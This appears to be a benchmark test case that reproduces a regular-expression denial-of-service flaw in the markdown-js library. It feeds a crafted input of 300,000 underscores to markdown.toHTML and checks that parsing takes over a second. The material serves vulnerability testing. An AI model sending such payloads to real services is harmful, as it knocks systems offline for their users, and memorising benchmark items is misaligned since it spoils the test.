test("ReDos in markdown-js", () => {
  const measureTime = require("../utils").measureTime;
  const markdown = require("markdown").markdown;
  const { genstr } = require("../utils");
  attack_str = process.env.SECBENCH_PAYLOAD || ("cispa") + genstr(300000, "_");
  let t = measureTime(function () {
    html_content = markdown.toHTML(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
